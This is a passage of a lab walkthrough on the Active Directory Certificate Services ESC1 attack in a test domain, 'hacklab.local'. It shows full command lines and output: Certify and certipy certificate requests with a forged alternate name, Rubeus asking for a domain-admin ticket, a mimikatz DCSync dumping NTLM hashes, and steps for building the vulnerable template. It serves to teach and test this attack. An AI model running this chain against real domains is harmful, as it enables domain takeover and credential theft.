BIHaMIHXMIHUoIHRoIHOhoHLbGRhcDovLy9DTj1oYWNrbGFiLVdJTi04SFBMRjhQ
U0hDMS1DQSxDTj1XSU4tOEhQTEY4UFNIQzEsQ049Q0RQLENOPVB1YmxpYyUyMEtl
eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGFj
a2xhYixEQz1sb2NhbD9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2Jq
ZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgc4GCCsGAQUFBwEBBIHBMIG+
MIG7BggrBgEFBQcwAoaBrmxkYXA6Ly8vQ049aGFja2xhYi1XSU4tOEhQTEY4UFNI
QzEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGFja2xhYixEQz1sb2NhbD9jQUNlcnRp
ZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTAN
BgkqhkiG9w0BAQsFAAOCAQEAgrGix8g/O+/lrkDJPslz+LBFfA4I8g5vsue3zYqL
7xA0pTibfgnYfP32UfR+dSMJEBE8uo0hA2Wl+Lo0E5O4Xzmsu/7blgc3nf5FsyDP
Tr3Wyg9cpkXkVDb4cTOHQ3kKvKPfEQjnXRpMxKk1Wy5MHxmgezH5tbAQHdBdrLMt
F4oXLfvFF5dRikkbdZoFK/EXl8jKcrDYkIH3EssXUN1MqrB6vdi5EjNw+zslcKoo
HzBxq/0vAb6vp5WpKB7fnCDTwJK0zMgGFtYdHRk+BDX6bmMYwYLLFSbFlkbxyxpI
C3BkT38Cq+TP9uEcy1WbqCWgMO9gSzp3TVzwFzwXPT4LYw==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:04.7931478
```

**Copy from  -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE----- section to a file on Linux/macOS open nano and save the contents as cert.pem, and run the openssl command to convert it to a .pfx. When prompted, don't enter a password:**

```
ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:
```

**Finally, move the cert.pfx to your target machine filesystem (manually or through Cobalt Strike), and request a TGT for the altname user using Rubeus:**

```
C:\Users\g.white\Desktop\Tools>Rubeus.exe asktgt /user:da1 /certificate:C:\Users\g.white\Desktop\Tools\Cert\cert.pfx

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=g.white, OU=Administration, OU=Head_Office, OU=Departments, DC=hacklab, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'hacklab.local\da1'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGDjCCBgqgAwIBBaEDAgEWooIFJTCCBSFhggUdMIIFGaADAgEFoQ8bDUhBQ0tMQUIuTE9DQUyiIjAg
      oAMCAQKhGTAXGwZrcmJ0Z3QbDWhhY2tsYWIubG9jYWyjggTbMIIE16ADAgESoQMCAQOiggTJBIIExbtJ
      /CkJ3ysfomHsKTwE/slEePtK76iHyi+mo8vYSfVu64lXcVFLGnRrpGnmbVYbCzTWGE+BmDHd2oiMdbO/
      e78+1Z6zgBsRxyPvDb/YthECsuZSMaLdloXUW+vSxxj2BUQtqJqnDlJ9OehTh0p37TvZVFMzdZrc9v7S
      uRSIQJM0RcKvLJqI+hQQYZPLruqGgKVXYru10DduizHARuqrdbzFUFNHcV3HrT4gYGUbyj+flXYkWo1l
      4AQs4E+wTrXxv6PncX5EJmGf1TpE7B4ZW9SGSaydZqLt1tq5SPKjTh2i5JWCcl4H/1C0yRPL05XRY9Nh
      oRJy2Dkx7pLt+yZVpfrGcM5t5G7E2N6rgItVlKnhyTkRpf+nzvPwujISv7TfigY6p8VMUyhfTGOEncZK
      HMxUxNUWvMhrq4I4jEno6Ql2RZpOrcZ826D3AGT8cAPzEGw/UH3+ZpA4Fyqcz3O0Wot97eBWT66XPQRI
      fPfpjGcu7ROT37fHIPLLGpBsVPz1Q3m8137M/q/RD/Fwni//cxIH8BwGms76eYIIjLhopyEMeTbD6j1y
      ulWw8hbeSzGpc70ReOEYO5Xhu4CsCE0xNo6VuSsDPoIDLTGMcU3dL5pgOA+lwACYRtb5qUAM8Ymib6O4
      nwDt8tRD0wkBEJKQt2hSLQz-Redacted-ZfsnkwH4q1PGA2KowtK07Os5gbkxKo
      VgELxPWxj7pqr8JpZVDWT7w+mj8/v4eoj6UKt2qpiySCyg6SWCz1M0YRGd7nWmLVzyvMVogUtv1a00kE
      dOJnjv19Q7l7+O74Pd0rX/EMH3/yfk5yNUpXvU4FiFe4MxOJjpZweknCa/OvossyhDvWpaHqD+Ag7A6U
      2eFvNyZjqEsLa8whe5fWh5ekFkCiaf0lNqjSm5gHBw4yXqxnECBid9RuvxaWJcPBEkzg0DCkx927PfI0
      RbLKlp7FtrBY5AjQYGKUXiV4j6sr7cWaN5WjvwAv6mxQ6FRzJaD6j6G1WZx8eUCr3kW+GTht5YLkzEqW
      WE6MutLZZ8i5UQrB8AXcI6dDrbWd3Pez8MbGy2CPJOiGLkwRsOpDcIBKi2npHbRTy+IRFSdB1RXKmwWF
      umxGF0B708p9klh8GruWnjBENgtavrSogbHuwVrLaBPYVfBcgG4CQRupBgQlAb3/5wFIQBScuDpel0hr
      zUJZRYzjpLk8iX/j4MR4RwNf4aOB1DCB0aADAgEAooHJBIHGfYHDMIHAoIG9MIG6MIG3oBswGaADAgEX
      oRIEEFIaGS8R6f/MBX769dkk7fahDxsNSEFDS0xBQi5MT0NBTKIQMA6gAwIBAaEHMAUbA2RhMaMHAwUA
      QOEAAKURGA8yMDI0MDcxNTEyMjUwNVqmERgPMjAyNDA3MTUyMjI1MDVapxEYDzIwMjQwNzIyMTIyNTA1
      WqgPGw1IQUNLTEFCLkxPQ0FMqSIwIKADAgECoRkwFxsGa3JidGd0Gw1oYWNrbGFiLmxvY2Fs

  ServiceName              :  krbtgt/hacklab.local
  ServiceRealm             :  HACKLAB.LOCAL
  UserName                 :  da1
  UserRealm                :  HACKLAB.LOCAL
  StartTime                :  15/07/2024 13:25:05
  EndTime                  :  15/07/2024 23:25:05
  RenewTill                :  22/07/2024 13:25:05
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  UhoZLx-Redacted-r12STt9g==
  ASREP (key)              :  902A410-Redacted-F7F5D96D


C:\Users\g.white\Desktop\Tools>
```

**You can then use mimikatz to dump the NTLM hash, you do not need to execute mimikatz with admin privileges.**

```
mimikatz # lsadump::dcsync /dc:WIN-8HPLF8PSHC1.hacklab.local /domain:hacklab.local /user:da1
[DC] 'hacklab.local' will be the domain
[DC] 'WIN-8HPLF8PSHC1.hacklab.local' will be the DC server
[DC] 'da1' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : da1

** SAM ACCOUNT **

SAM Username         : da1
User Principal Name  : da1@hacklab.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 15/04/2024 12:37:12
Object Security ID   : S-1-5-21-2199964591-1196550447-1073987862-1103
Object Relative ID   : 1103

Credentials:
  Hash NTLM: fc525c9683e8fe067095ba2ddc971889
    ntlm- 0: fc525c9683e8fe067095ba2ddc971889
    lm  - 0: 1037af637604d47c1309c0d208172545
```


**Using Certify errors**

The below error was caused because I executed the certify.exe file without also moving the Interop.CERTENROLLLib.dll file. Add the Interop.CERTENROLLLib.dll file to the same directory and the problem is fixed. 

```
C:\Users\g.white\Desktop\Tools>certify.exe request /ca:WIN-8HPLF8PSHC1.hacklab.local\hacklab-WIN-8HPLF8PSHC1-CA /template:ESC1-Vun1 /altname:da1

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[!] Unhandled Certify exception:

System.IO.FileNotFoundException: Could not load file or assembly 'Interop.CERTENROLLLib, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. The system cannot find the file specified.
File name: 'Interop.CERTENROLLLib, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
   at Certify.Cert.RequestCert(String CA, Boolean machineContext, String templateName, String subject, String altName, String sidExtension, Boolean install)
   at Certify.Commands.Request.Execute(Dictionary`2 arguments)
   at Certify.CommandCollection.ExecuteCommand(String commandName, Dictionary`2 arguments)
   at Certify.Program.MainExecute(String commandName, Dictionary`2 parsedArgs)
```




**Creating Vulnerable ESC1 Certificate**


1.	Open Server Manager / Tools / Certification Authority.

![1](https://github.com/myexploit/LAB/assets/15686493/a62c3e4f-8522-4c34-9d67-c74291dc1b32)


2.	Right click on Certificate Templates / Manage.

![2](https://github.com/myexploit/LAB/assets/15686493/50df8455-e8a0-4586-9ac4-0abecefe906f)


3.	Pull down to User right click select Duplicate Template.

![3](https://github.com/myexploit/LAB/assets/15686493/563f34d8-a250-474f-ac55-9cde9f2d284c)


4.	Click on the General tab and rename the certificate.

![4](https://github.com/myexploit/LAB/assets/15686493/d1c4fb5b-4a03-4223-8453-83226a87ae50)

5.	Click on the Security tab and for Authenticated Users, tick Enroll.

![5](https://github.com/myexploit/LAB/assets/15686493/8d4dfdf4-b496-4d60-923e-b3ee85aedace)

6.	Click on the Subject Name and select Supply in the request.

![6](https://github.com/myexploit/LAB/assets/15686493/cbd3078b-4e1a-49da-ac8d-a52000337240)

7.	Apply then click OK.

8.	Click back to Certification Authority / Certificate Templates and right click then select Certificate Template to Issue.

![8](https://github.com/myexploit/LAB/assets/15686493/41726a53-a2e8-440e-9d49-dcbfda625057)

9.	Select your created certificate and then click OK.

![9](https://github.com/myexploit/LAB/assets/15686493/6a02fc9c-a619-4e7c-ae88-0cd93bda780a)

10.	You should then see your active certificate.

![10](https://github.com/myexploit/LAB/assets/15686493/2ddd7d05-874d-4f66-b979-60f668c7a462)


The following has been included to demonstrate that the certificate was then vulnerable.

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy find -u g.white -p "Passw0rd!" -dc-ip 192.168.68.230 -scheme ldaps -ldap-channel-binding
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 36 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 14 enabled certificate templates
[*] Trying to get CA configuration for 'hacklab-WIN-8HPLF8PSHC1-CA' via CSRA
[!] Got error while trying to get CA configuration for 'hacklab-WIN-8HPLF8PSHC1-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'hacklab-WIN-8HPLF8PSHC1-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'hacklab-WIN-8HPLF8PSHC1-CA'
[*] Saved BloodHound data to '20240702112224_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20240702112224_Certipy.txt'
[*] Saved JSON output to '20240702112224_Certipy.json'


(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ gedit 20240702112224_Certipy.txt


Certificate Authorities
  0
    CA Name                             : hacklab-WIN-8HPLF8PSHC1-CA
    DNS Name                            : WIN-8HPLF8PSHC1.hacklab.local
    Certificate Subject                 : CN=hacklab-WIN-8HPLF8PSHC1-CA, DC=hacklab, DC=local
    Certificate Serial Number           : 354DB064F33080BD4EB9FEAABE87DCF1
    Certificate Validity Start          : 2024-04-23 13:56:37+00:00
    Certificate Validity End            : 2029-04-23 14:06:33+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : HACKLAB.LOCAL\Administrators
      Access Rights
        ManageCertificates              : HACKLAB.LOCAL\Administrators
                                          HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
        ManageCa                        : HACKLAB.LOCAL\Administrators
                                          HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
        Enroll                          : HACKLAB.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : Vuln_Cert
    Display Name                        : Vuln_Cert
    Certificate Authorities             : hacklab-WIN-8HPLF8PSHC1-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Domain Users
                                          HACKLAB.LOCAL\Enterprise Admins
                                          HACKLAB.LOCAL\Authenticated Users
      Object Control Permissions
        Owner                           : HACKLAB.LOCAL\Administrator
        Write Owner Principals          : HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
                                          HACKLAB.LOCAL\Administrator
        Write Dacl Principals           : HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
                                          HACKLAB.LOCAL\Administrator
        Write Property Principals       : HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
                                          HACKLAB.LOCAL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'HACKLAB.LOCAL\\Domain Users' and 'HACKLAB.LOCAL\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication


(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy req -u g.white -k -no-pass -ca 'hacklab-WIN-8HPLF8PSHC1-CA' -target 'WIN-8HPLF8PSHC1.hacklab.local' -template Vuln_Cert -dc-ip 192.168.68.230 -ptt -upn 'da1@hacklab.local' -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Domain retrieved from CCache: HACKLAB.LOCAL
[+] Username retrieved from CCache: g.white
[+] Trying to resolve 'WIN-8HPLF8PSHC1.hacklab.local' at '192.168.68.230'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Using Kerberos Cache: g.white.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: g.white
[+] Getting TGS for 'host/WIN-8HPLF8PSHC1.hacklab.local'
[+] Got TGS for 'host/WIN-8HPLF8PSHC1.hacklab.local'
[+] Trying to connect to endpoint: ncacn_np:192.168.68.230[\pipe\cert]
[+] Connected to endpoint: ncacn_np:192.168.68.230[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'da1@hacklab.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'da1.pfx'


(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy auth -pfx da1.pfx -dc-ip 192.168.68.230
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: da1@hacklab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'da1.ccache'
[*] Trying to retrieve NT hash for 'da1'
[*] Got hash for 'da1@hacklab.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889


```













